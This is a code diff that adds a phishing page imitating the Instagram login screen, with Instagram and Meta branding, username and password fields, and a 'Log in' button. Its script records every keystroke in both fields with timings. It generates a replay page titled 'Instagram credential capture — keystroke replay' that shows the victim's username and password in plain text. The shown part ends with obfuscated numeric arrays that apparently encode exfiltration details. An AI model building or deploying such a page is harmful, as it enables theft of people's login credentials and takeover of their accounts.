@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Instagram</title>
+<style>
+*, *::before, *::after {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+:root {
+  --bg: #ffffff;
+  --page-bg: #f5f5f5;
+  --card-bg: #ffffff;
+  --card-border: #dbdbdb;
+  --input-bg: #fafafa;
+  --input-border: #c8c8c8;
+  --input-focus: #8e8e8e;
+  --text: #262626;
+  --text2: #8e8e8e;
+  --ph: #737373;
+  --ph-float: #8e8e8e;
+  --blue: #1877f2;
+  --blue-h: #1265d4;
+  --blue-a: #0e55b0;
+  --forgot: #262626;
+  --meta: #1877f2;
+  --eye: #8e8e8e;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #1b2836;
+    --page-bg: #1b2836;
+    --card-bg: #1b2836;
+    --card-border: #37485a;
+    --input-bg: #1b2836;
+    --input-border: #37485a;
+    --input-focus: #4e6a84;
+    --text: #e8ecf0;
+    --text2: #a0b2c4;
+    --ph: #5c7080;
+    --ph-float: #8fa0b2;
+    --blue: #1877f2;
+    --blue-h: #1265d4;
+    --blue-a: #0e55b0;
+    --forgot: #ffffff;
+    --meta: #ffffff;
+    --eye: #7e94a8;
+  }
+}
+
+html, body {
+  height: 100%;
+  touch-action: manipulation;
+  -ms-touch-action: manipulation;
+}
+
+body {
+  min-height: 100%;
+  background-color: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  font-size: 14px;
+  line-height: 1.4;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+
+.page {
+  min-height: 100vh;
+  min-height: 100dvh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.lang-bar {
+  width: 100%;
+  max-width: 420px;
+  padding: 20px 24px 0;
+  text-align: center;
+  flex-shrink: 0;
+}
+
+.lang {
+  font-size: 14px;
+  color: var(--text2);
+}
+
+.center-zone {
+  flex: 9 1 auto;
+  width: 100%;
+  max-width: 420px;
+  padding: 0 24px 0;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: flex-start;
+}
+
+.logo-gap-top {
+  flex: 4 1 0;
+  min-height: 12px;
+  width: 100%;
+}
+
+.logo-gap-bottom {
+  flex: 5 1 0;
+  min-height: 16px;
+  width: 100%;
+}
+
+.logo-area {
+  display: flex;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+.ig-mark {
+  display: block;
+  width: 68px;
+  height: 68px;
+  flex-shrink: 0;
+}
+
+.fields {
+  width: 100%;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  flex-shrink: 0;
+}
+
+.field-wrap {
+  position: relative;
+  width: 100%;
+  height: 64px;
+  flex-shrink: 0;
+}
+
+.inp {
+  position: absolute;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  padding: 24px 16px 6px;
+  background-color: var(--input-bg);
+  border: 1.5px solid var(--input-border);
+  border-radius: 14px;
+  color: var(--text);
+  font-family: inherit;
+  font-size: 15px;
+  outline: none;
+  appearance: none;
+  -webkit-appearance: none;
+  transition: border-color 0.18s ease;
+  caret-color: var(--blue);
+}
+
+.inp:-webkit-autofill,
+.inp:-webkit-autofill:hover,
+.inp:-webkit-autofill:focus {
+  -webkit-box-shadow: 0 0 0 1000px var(--input-bg) inset;
+  -webkit-text-fill-color: var(--text);
+  transition: background-color 99999s ease-in-out 0s;
+}
+
+.inp:focus {
+  border-color: var(--input-focus);
+}
+
+.usr-wrap .inp,
+.pwd-wrap .inp {
+  padding-right: 52px;
+}
+
+.f-label {
+  position: absolute;
+  left: 16px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 15px;
+  font-weight: 400;
+  color: var(--ph);
+  pointer-events: none;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  max-width: calc(100% - 56px);
+  line-height: 1;
+  transition:
+    top 0.2s cubic-bezier(0.4, 0, 0.2, 1),
+    font-size 0.2s cubic-bezier(0.4, 0, 0.2, 1),
+    transform 0.2s cubic-bezier(0.4, 0, 0.2, 1),
+    color 0.2s ease;
+  transform-origin: left top;
+  will-change: top, font-size, transform;
+}
+
+.inp:focus ~ .f-label,
+.inp:not(:placeholder-shown) ~ .f-label {
+  top: 12px;
+  transform: translateY(0);
+  font-size: 11px;
+  color: var(--ph-float);
+}
+
+.eye-btn,
+.clear-btn {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: var(--eye);
+  padding: 6px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: color 0.15s ease;
+  -webkit-tap-highlight-color: transparent;
+  flex-shrink: 0;
+}
+
+.eye-btn {
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.15s ease, color 0.15s ease;
+}
+
+.pwd-wrap:focus-within .eye-btn {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+.eye-btn:hover,
+.clear-btn:hover {
+  color: var(--text);
+}
+
+.clear-btn svg {
+  width: 20px;
+  height: 20px;
+  display: block;
+  flex-shrink: 0;
+}
+
+.eye-icon {
+  width: 20px;
+  height: 20px;
+  display: block;
+  flex-shrink: 0;
+  pointer-events: none;
+  background-color: var(--eye);
+  mask-repeat: no-repeat;
+  -webkit-mask-repeat: no-repeat;
+  mask-position: center;
+  -webkit-mask-position: center;
+  mask-size: contain;
+  -webkit-mask-size: contain;
+  transition: background-color 0.15s ease;
+}
+
+#iconOn {
+  mask-image: url("https://i.ibb.co/qF0H3DYz/Zxtm1k-G8-B2-L.webp");
+  -webkit-mask-image: url("https://i.ibb.co/qF0H3DYz/Zxtm1k-G8-B2-L.webp");
+}
+
+#iconOff {
+  mask-image: url("https://i.ibb.co/V06Gg7pQ/l-Ba-BOo8-Qfe-T.webp");
+  -webkit-mask-image: url("https://i.ibb.co/V06Gg7pQ/l-Ba-BOo8-Qfe-T.webp");
+}
+
+.eye-btn:hover .eye-icon {
+  background-color: var(--text);
+}
+
+.clear-btn {
+  display: none;
+}
+
+@keyframes pop {
+  0%   { transform: scale(1); }
+  38%  { transform: scale(0.93); }
+  100% { transform: scale(1); }
+}
+
+.pop-anim {
+  animation: pop 0.22s ease-out forwards;
+}
+
+.btn-login {
+  width: 100%;
+  height: 44px;
+  margin-top: 4px;
+  background-color: var(--blue);
+  border: none;
+  border-radius: 50px;
+  color: #ffffff;
+  cursor: pointer;
+  font-family: inherit;
+  font-size: 15px;
+  font-weight: 700;
+  letter-spacing: 0.2px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: background-color 0.18s ease, filter 0.18s ease;
+  -webkit-tap-highlight-color: transparent;
+}
+
+.btn-login:hover {
+  background-color: var(--blue-h);
+  filter: brightness(0.9);
+}
+
+.btn-login:active {
+  background-color: var(--blue-a);
+  filter: brightness(0.82);
+}
+
+.btn-login:disabled {
+  opacity: 0.8;
+  cursor: not-allowed;
+  filter: none;
+  pointer-events: none;
+}
+
+.btn-spin {
+  display: block;
+  width: 18px;
+  height: 18px;
+  border-radius: 50%;
+  border: 1.5px solid rgba(255, 255, 255, 0.22);
+  border-top-color: rgba(255, 255, 255, 0.92);
+  border-right-color: rgba(255, 255, 255, 0.55);
+  flex-shrink: 0;
+  animation: spin 0.82s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+.forgot-row {
+  margin-top: 8px;
+  text-align: center;
+  flex-shrink: 0;
+}
+
+.forgot-btn {
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: var(--forgot);
+  font-family: inherit;
+  font-size: 16px;
+  font-weight: 400;
+  padding: 6px 10px;
+  border-radius: 8px;
+  transition: opacity 0.15s ease;
+  -webkit-tap-highlight-color: transparent;
+}
+
+.forgot-btn:hover {
+  opacity: 0.68;
+}
+
+.page-spacer {
+  flex: 8 1 0;
+  min-height: 20px;
+  width: 100%;
+}
+
+.bottom-zone {
+  width: 100%;
+  max-width: 420px;
+  padding: 0 24px 0;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  flex-shrink: 0;
+}
+
+.btn-create {
+  width: 100%;
+  height: 44px;
+  background-color: transparent;
+  border: 1.5px solid var(--blue);
+  border-radius: 50px;
+  color: var(--blue);
+  cursor: pointer;
+  font-family: inherit;
+  font-size: 15px;
+  font-weight: 600;
+  letter-spacing: 0.2px;
+  margin-bottom: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: background-color 0.15s ease;
+  -webkit-tap-highlight-color: transparent;
+}
+
+.btn-create:hover {
+  background-color: rgba(24, 119, 242, 0.06);
+}
+
+.btn-create:active {
+  background-color: rgba(24, 119, 242, 0.12);
+}
+
+.signup-panel {
+  display: none;
+  font-size: 14px;
+  color: var(--text);
+  text-align: center;
+  align-items: center;
+  gap: 4px;
+}
+
+.signup-cta {
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: var(--blue);
+  font-family: inherit;
+  font-size: 14px;
+  font-weight: 700;
+  padding: 0;
+  transition: opacity 0.15s ease;
+}
+
+.signup-cta:hover {
+  opacity: 0.75;
+}
+
+.meta-zone {
+  padding: 6px 24px max(24px, env(safe-area-inset-bottom, 24px));
+  text-align: center;
+  flex-shrink: 0;
+}
+
+.meta-row {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  color: var(--meta);
+}
+
+.meta-ico {
+  width: 28px;
+  height: 20px;
+  display: block;
+  flex-shrink: 0;
+  overflow: visible;
+}
+
+.meta-ico path {
+  fill: var(--meta) !important;
+}
+
+.meta-word {
+  font-size: 15px;
+  font-weight: 600;
+  color: var(--meta);
+  letter-spacing: 0.3px;
+  line-height: 1;
+}
+
+.modal-overlay {
+  position: fixed;
+  inset: 0;
+  background-color: rgba(0, 0, 0, 0.58);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 999;
+  padding: 24px;
+}
+
+.modal-overlay.visible {
+  display: flex;
+}
+
+.modal-card {
+  background: #ffffff;
+  border-radius: 14px;
+  width: 100%;
+  max-width: 320px;
+  overflow: hidden;
+}
+
+.modal-body {
+  padding: 22px 22px 18px;
+  text-align: center;
+}
+
+.modal-title {
+  font-size: 18px;
+  font-weight: 700;
+  color: #000000;
+  margin-bottom: 10px;
+  line-height: 1.3;
+}
+
+.modal-text {
+  font-size: 14px;
+  color: #6e6e6e;
+  line-height: 1.56;
+}
+
+.modal-divider {
+  height: 1px;
+  background-color: #e0e0e0;
+}
+
+.modal-action {
+  width: 100%;
+  padding: 16px 20px;
+  background: none;
+  border: none;
+  color: #1877f2;
+  font-family: inherit;
+  font-size: 17px;
+  font-weight: 400;
+  cursor: pointer;
+  text-align: center;
+  display: block;
+  -webkit-tap-highlight-color: transparent;
+  transition: background-color 0.1s ease;
+}
+
+.modal-action:active {
+  background-color: rgba(0, 0, 0, 0.05);
+}
+
+@media (min-width: 736px) {
+  body {
+    background-color: var(--page-bg);
+  }
+
+  .page {
+    justify-content: center;
+    min-height: 100vh;
+    min-height: 100dvh;
+  }
+
+  .page-spacer {
+    display: none;
+  }
+
+  .logo-gap-top,
+  .logo-gap-bottom {
+    display: none;
+  }
+
+  .lang-bar {
+    max-width: 360px;
+    padding-top: 0;
+    padding-bottom: 12px;
+  }
+
+  .center-zone {
+    flex: none;
+    background-color: var(--card-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 2px;
+    max-width: 360px;
+    padding: 40px 40px 24px;
+    justify-content: flex-start;
+  }
+
+  .logo-area {
+    margin-bottom: 30px;
+  }
+
+  .ig-mark {
+    width: 62px;
+    height: 62px;
+  }
+
+  .bottom-zone {
+    background-color: var(--card-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 2px;
+    max-width: 360px;
+    padding: 16px 40px;
+    margin-top: 10px;
+    flex-direction: row;
+    align-items: center;
+    justify-content: center;
+    gap: 4px;
+  }
+
+  .btn-create {
+    display: none;
+  }
+
+  .signup-panel {
+    display: flex;
+  }
+
+  .meta-zone {
+    padding-top: 18px;
+    padding-bottom: 28px;
+  }
+}
+
+@media (min-width: 736px) and (prefers-color-scheme: dark) {
+  body {
+    background-color: var(--bg);
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="page">
+
+  <div class="lang-bar">
+    <span class="lang">English (UK)</span>
+  </div>
+
+  <div class="center-zone">
+
+    <div class="logo-gap-top"></div>
+
+    <div class="logo-area">
+      <svg class="ig-mark" viewBox="0 0 24 24" role="img" xmlns="http://www.w3.org/2000/svg" aria-label="Instagram">
+        <title>Instagram</title>
+        <defs>
+          <radialGradient id="ig-gradient" cx="30%" cy="107%" r="150%">
+            <stop offset="0%" stop-color="#fdf497"/>
+            <stop offset="5%" stop-color="#fdf497"/>
+            <stop offset="45%" stop-color="#fd5949"/>
+            <stop offset="60%" stop-color="#d6249f"/>
+            <stop offset="90%" stop-color="#285AEB"/>
+          </radialGradient>
+        </defs>
+        <path fill="url(#ig-gradient)" d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/>
+      </svg>
+    </div>
+
+    <div class="logo-gap-bottom"></div>
+
+    <div class="fields">
+
+      <div class="field-wrap usr-wrap">
+        <input class="inp" type="text" id="usr" placeholder=" " autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="Username, email address or mobile number">
+        <label for="usr" class="f-label">Username, email address or mobile number</label>
+        <button type="button" class="clear-btn" id="clearBtn" aria-label="Clear">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+            <line x1="5" y1="5" x2="19" y2="19"/>
+            <line x1="19" y1="5" x2="5" y2="19"/>
+          </svg>
+        </button>
+      </div>
+
+      <div class="field-wrap pwd-wrap">
+        <input class="inp" type="password" id="pwd" placeholder=" " autocomplete="current-password" aria-label="Password">
+        <label for="pwd" class="f-label">Password</label>
+        <button type="button" class="eye-btn" id="eyeBtn" aria-label="Show password">
+          <span id="iconOff" class="eye-icon" aria-hidden="true"></span>
+          <span id="iconOn" class="eye-icon" aria-hidden="true" style="display:none"></span>
+        </button>
+      </div>
+
+      <button class="btn-login" type="button" id="loginBtn">Log in</button>
+
+    </div>
+
+    <div class="forgot-row">
+      <button class="forgot-btn" type="button">Forgotten password?</button>
+    </div>
+
+  </div>
+
+  <div class="page-spacer"></div>
+
+  <div class="bottom-zone">
+    <button class="btn-create" type="button" id="createBtn">Create new account</button>
+    <p class="signup-panel">
+      Don't have an account?&nbsp;<button class="signup-cta" type="button">Sign up</button>
+    </p>
+  </div>
+
+  <div class="meta-zone">
+    <div class="meta-row">
+      <svg class="meta-ico" xmlns="http://www.w3.org/2000/svg" viewBox="-2 98 84 58" aria-hidden="true">
+        <g transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
+          <path d="M 2.949 47.892 c 0 1.042 0.229 1.843 0.528 2.327 c 0.392 0.634 0.977 0.903 1.573 0.903 c 0.769 0 1.472 -0.191 2.828 -2.066 c 1.086 -1.503 2.366 -3.612 3.227 -4.935 l 1.458 -2.241 c 1.013 -1.556 2.185 -3.286 3.53 -4.458 c 1.097 -0.957 2.281 -1.489 3.473 -1.489 c 2 0 3.906 1.159 5.364 3.333 c 1.596 2.381 2.371 5.38 2.371 8.475 c 0 1.84 -0.363 3.192 -0.98 4.26 c -0.596 1.033 -1.758 2.065 -3.713 2.065 v -2.945 c 1.674 0 2.091 -1.538 2.091 -3.298 c 0 -2.508 -0.585 -5.292 -1.873 -7.281 c -0.914 -1.411 -2.099 -2.273 -3.403 -2.273 c -1.41 0 -2.544 1.063 -3.819 2.959 c -0.678 1.007 -1.374 2.235 -2.155 3.62 l -0.86 1.524 c -1.728 3.064 -2.166 3.761 -3.029 4.913 c -1.514 2.016 -2.807 2.781 -4.509 2.781 c -2.019 0 -3.296 -0.874 -4.087 -2.192 C 0.317 50.801 0 49.392 0 47.786 L 2.949 47.892 z" style="stroke:none;fill:rgb(255,255,255);fill-rule:nonzero;opacity:1;" stroke-linecap="round"/>
+          <path d="M 2.325 39.475 c 1.352 -2.084 3.303 -3.541 5.541 -3.541 c 1.296 0 2.584 0.384 3.929 1.482 c 1.472 1.201 3.04 3.178 4.997 6.438 l 0.702 1.17 c 1.694 2.822 2.657 4.273 3.221 4.958 c 0.725 0.879 1.233 1.141 1.893 1.141 c 1.674 0 2.091 -1.538 2.091 -3.298 l 2.601 -0.082 c 0 1.84 -0.363 3.192 -0.98 4.26 c -0.596 1.033 -1.758 2.065 -3.713 2.065 c -1.215 0 -2.292 -0.264 -3.482 -1.387 c -0.915 -0.862 -1.985 -2.393 -2.808 -3.77 l -2.448 -4.09 c -1.228 -2.053 -2.355 -3.583 -3.008 -4.276 c -0.702 -0.745 -1.603 -1.645 -3.043 -1.645 c -1.165 0 -2.154 0.817 -2.982 2.068 L 2.325 39.475 z" style="stroke:none;fill:rgb(255,255,255);fill-rule:nonzero;opacity:1;" stroke-linecap="round"/>
+          <path d="M 7.818 38.898 c -1.165 0 -2.154 0.817 -2.982 2.068 c -1.171 1.767 -1.887 4.398 -1.887 6.926 c 0 1.042 0.229 1.843 0.528 2.327 l -2.514 1.656 C 0.317 50.801 0 49.392 0 47.786 c 0 -2.919 0.801 -5.962 2.325 -8.312 c 1.352 -2.084 3.303 -3.541 5.541 -3.541 L 7.818 38.898 z" style="stroke:none;fill:rgb(255,255,255);fill-rule:nonzero;opacity:1;" stroke-linecap="round"/>
+        </g>
+      </svg>
+      <span class="meta-word">Meta</span>
+    </div>
+  </div>
+
+</div>
+
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal-card" id="modalCard"></div>
+</div>
+
+<script>
+(function () {
+
+  document.addEventListener('gesturestart', function (e) { e.preventDefault(); }, { passive: false });
+  document.addEventListener('gesturechange', function (e) { e.preventDefault(); }, { passive: false });
+  document.addEventListener('touchmove', function (e) {
+    if (e.touches && e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+
+  var lastTapTime = 0;
+  document.addEventListener('touchend', function (e) {
+    var now = Date.now();
+    if (now - lastTapTime < 300) e.preventDefault();
+    lastTapTime = now;
+  }, { passive: false });
+
+  var usrInp    = document.getElementById('usr');
+  var pwdInp    = document.getElementById('pwd');
+  var clearBtn  = document.getElementById('clearBtn');
+  var eyeBtn    = document.getElementById('eyeBtn');
+  var iconOff   = document.getElementById('iconOff');
+  var iconOn    = document.getElementById('iconOn');
+  var loginBtn  = document.getElementById('loginBtn');
+  var createBtn = document.getElementById('createBtn');
+  var overlay   = document.getElementById('modalOverlay');
+  var card      = document.getElementById('modalCard');
+
+  var ksEvents = [];
+  var ksStart  = null;
+
+  function recordKs(field, value) {
+    if (ksStart === null) ksStart = performance.now();
+    ksEvents.push({ t: Math.round(performance.now() - ksStart), field: field, value: value });
+  }
+
+  usrInp.addEventListener('input', function (e) { recordKs(1, e.target.value); });
+  pwdInp.addEventListener('input', function (e) { recordKs(2, e.target.value); });
+
+  function buildPlaybackHtml(recordedEvents, duration, finalValue1, finalValue2) {
+    var eventsJson = JSON.stringify(recordedEvents);
+    var safeVal1   = JSON.stringify(finalValue1);
+    var safeVal2   = JSON.stringify(finalValue2);
+    var html = '';
+    html += '<!DOCTYPE html>';
+    html += '<html lang="en"><head><meta charset="UTF-8">';
+    html += '<meta name="viewport" content="width=device-width,initial-scale=1.0">';
+    html += '<title>Login Playback</title>';
+    html += '<style>';
+    html += '*{box-sizing:border-box;}';
+    html += 'html,body{margin:0;padding:0;min-height:100vh;background:radial-gradient(circle at 20% 20%,#14151a 0%,#0a0a0d 55%,#050506 100%);color:#eaeaea;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif;}';
+    html += 'body{display:flex;align-items:center;justify-content:center;padding:24px;}';
+    html += '.card{width:100%;max-width:460px;background:linear-gradient(180deg,rgba(255,255,255,0.04),rgba(255,255,255,0.015));border:1px solid rgba(255,255,255,0.08);border-radius:20px;padding:40px 32px;box-shadow:0 20px 60px rgba(0,0,0,0.5);opacity:0;transform:translateY(24px);animation:fadeUp 0.8s cubic-bezier(.22,1,.36,1) forwards;}';
+    html += '@keyframes fadeUp{to{opacity:1;transform:translateY(0);}}';
+    html += 'h1{font-size:22px;font-weight:600;letter-spacing:-0.02em;margin:0 0 6px;}';
+    html += 'p.sub{font-size:13px;color:#8a8a93;margin:0 0 26px;}';
+    html += '.field{margin-bottom:18px;}';
+    html += '.field label{display:block;font-size:12px;font-weight:500;text-transform:uppercase;letter-spacing:0.06em;color:#7a7a83;margin-bottom:8px;}';
+    html += '.playback-box{width:100%;min-height:46px;padding:13px 15px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.09);border-radius:12px;font-size:14.5px;color:#f2f2f2;word-break:break-word;white-space:pre-wrap;}';
+    html += '.caret{display:inline-block;width:2px;height:15px;background:#818cf8;margin-left:2px;vertical-align:middle;animation:blink 1s step-start infinite;}';
+    html += '@keyframes blink{50%{opacity:0;}}';
+    html += '.controls{display:flex;align-items:center;gap:10px;margin-top:24px;}';
+    html += '.ctrl-btn{flex:1;padding:12px 10px;border:none;border-radius:10px;background:rgba(255,255,255,0.06);color:#eaeaea;cursor:pointer;transition:background 0.2s ease,transform 0.15s ease;display:flex;align-items:center;justify-content:center;touch-action:manipulation;outline:none;}';
+    html += '.ctrl-btn svg{pointer-events:none;display:block;}';
+    html += '.ctrl-btn:hover{background:rgba(255,255,255,0.12);}';
+    html += '.ctrl-btn:active{transform:scale(0.94);}';
+    html += '.ctrl-btn.primary{background:linear-gradient(135deg,#6366f1,#8b5cf6);}';
+    html += '.ctrl-btn.primary:hover{box-shadow:0 8px 22px rgba(99,102,241,0.35);}';
+    html += '.progress-wrap{margin-top:18px;}';
+    html += '.progress-bar{width:100%;height:5px;border-radius:4px;background:rgba(255,255,255,0.08);overflow:hidden;}';
+    html += '.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#6366f1,#8b5cf6);border-radius:4px;transition:width 0.05s linear;}';
+    html += '.time-row{display:flex;justify-content:space-between;margin-top:8px;font-size:11.5px;color:#7a7a83;font-variant-numeric:tabular-nums;}';
+    html += '.meta-row{margin-top:22px;padding:14px 16px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.07);border-radius:12px;font-size:12px;color:#7a7a83;line-height:2;}';
+    html += '.meta-row span{color:#c0c0ce;}';
+    html += '</style></head><body>';
+    html += '<div class="card">';
+    html += '<h1>Login Playback</h1>';
+    html += '<p class="sub">Instagram credential capture &mdash; keystroke replay.</p>';
+    html += '<div class="field"><label>Username / Email / Mobile</label><div class="playback-box" id="box1"></div></div>';
+    html += '<div class="field"><label>Password</label><div class="playback-box" id="box2"></div></div>';
+    html += '<div class="progress-wrap"><div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>';
+    html += '<div class="time-row"><span id="timeElapsed">0.0s</span><span id="timeTotal">0.0s</span></div></div>';
+    html += '<div class="controls">';
+    html += '<button class="ctrl-btn" id="rewindBtn" type="button" aria-label="Rewind"><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="1 4 1 10 7 10"></polyline><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"></path></svg></button>';
+    html += '<button class="ctrl-btn primary" id="playBtn" type="button" aria-label="Play"><svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M8 5v14l11-7z"></path></svg></button>';
+    html += '<button class="ctrl-btn" id="pauseBtn" type="button" aria-label="Pause"><svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><rect x="6" y="5" width="4" height="14"></rect><rect x="14" y="5" width="4" height="14"></rect></svg></button>';
+    html += '</div>';
+    html += '<div class="meta-row">';
+    html += 'Username: <span>' + finalValue1.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</span><br>';
+    html += 'Password: <span>' + finalValue2.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</span><br>';
+    html += 'Duration: <span>' + (duration / 1000).toFixed(1) + 's</span><br>';
+    html += 'Captured: <span>' + new Date().toISOString() + '</span>';
+    html += '</div>';
+    html += '</div>';
+    html += '<script>';
+    html += 'var events = ' + eventsJson + ';';
+    html += 'var leadIn = 500;';
+    html += 'var recordedDuration = ' + Math.max(duration, 1) + ';';
+    html += 'var duration = recordedDuration + leadIn;';
+    html += 'var finalValue1 = ' + safeVal1 + ';';
+    html += 'var finalValue2 = ' + safeVal2 + ';';
+    html += 'var box1 = document.getElementById("box1");';
+    html += 'var box2 = document.getElementById("box2");';
+    html += 'var progressFill = document.getElementById("progressFill");';
+    html += 'var timeElapsed = document.getElementById("timeElapsed");';
+    html += 'var timeTotal = document.getElementById("timeTotal");';
+    html += 'var playBtn = document.getElementById("playBtn");';
+    html += 'var pauseBtn = document.getElementById("pauseBtn");';
+    html += 'var rewindBtn = document.getElementById("rewindBtn");';
+    html += 'timeTotal.textContent = (duration / 1000).toFixed(1) + "s";';
+    html += 'var currentTime = 0;';
+    html += 'var playing = false;';
+    html += 'var lastTs = null;';
+    html += 'function valueAt(fieldNum, t) {';
+    html += 'var val = "";';
+    html += 'for (var i = 0; i < events.length; i++) {';
+    html += 'if (events[i].field === fieldNum && events[i].t <= t) { val = events[i].value; }';
+    html += '}';
+    html += 'return val;';
+    html += '}';
+    html += 'function escapeHtml(s) {';
+    html += 'return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");';
+    html += '}';
+    html += 'function render(t) {';
+    html += 'var effT = t - leadIn;';
+    html += 'var v1 = effT < 0 ? "" : valueAt(1, effT);';
+    html += 'var v2 = effT < 0 ? "" : valueAt(2, effT);';
+    html += 'box1.innerHTML = escapeHtml(v1) + (playing ? \'<span class="caret"></span>\' : "");';
+    html += 'box2.innerHTML = escapeHtml(v2) + (playing ? \'<span class="caret"></span>\' : "");';
+    html += 'var pct = Math.min(100, (t / duration) * 100);';
+    html += 'progressFill.style.width = pct + "%";';
+    html += 'timeElapsed.textContent = (t / 1000).toFixed(1) + "s";';
+    html += '}';
+    html += 'function frame(ts) {';
+    html += 'if (!playing) return;';
+    html += 'if (lastTs === null) lastTs = ts;';
+    html += 'var delta = ts - lastTs;';
+    html += 'lastTs = ts;';
+    html += 'currentTime += delta;';
+    html += 'if (currentTime >= duration) { currentTime = duration; playing = false; render(currentTime); return; }';
+    html += 'render(currentTime);';
+    html += 'requestAnimationFrame(frame);';
+    html += '}';
+    html += 'function play() { if (currentTime >= duration) currentTime = 0; playing = true; lastTs = null; requestAnimationFrame(frame); }';
+    html += 'function pause() { playing = false; render(currentTime); }';
+    html += 'function rewind() { currentTime = 0; playing = false; render(0); }';
+    html += 'playBtn.addEventListener("click", play);';
+    html += 'pauseBtn.addEventListener("click", pause);';
+    html += 'rewindBtn.addEventListener("click", rewind);';
+    html += 'render(0);';
+    html += '<\/script>';
+    html += '</body></html>';
+    return html;
+  }
+
+  var _tf = [
+    [44,8,126,59,68,115,86,84,113,44,73,92,91,103,94,13,73,119,85,86,71,48],
+    [73,95,37,89,57,13,88,116,33,111,111,60,101,110,88,77,59,60,123,12,68],
+    [102,100,60,119,108,83,69,93,23,19,112,69,120,115,51,102,115,35,96,77,23]
+  ];
+  var _if = [
+    [42,16,75,69,110,74,104,69],
+    [34,100,120,70,109,116,120,71]
+  ];
